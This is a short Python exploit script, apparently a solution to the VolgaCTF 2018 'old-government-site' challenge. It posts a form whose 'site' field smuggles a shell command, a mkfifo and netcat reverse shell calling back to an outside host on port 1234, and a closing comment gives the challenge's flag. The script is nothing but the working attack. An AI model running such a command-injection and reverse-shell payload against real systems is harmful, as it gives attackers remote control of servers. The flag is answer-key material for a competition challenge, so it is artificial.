#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests

r = requests.post("http://old-government-site.quals.2018.volgactf.ru:8080/page?id=18", data={
    "site": "|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc l4ys.tw 1234 >/tmp/f", 
    "description": "aaa"})

# VolgaCTF{dedicated_to_all_goverment_site}
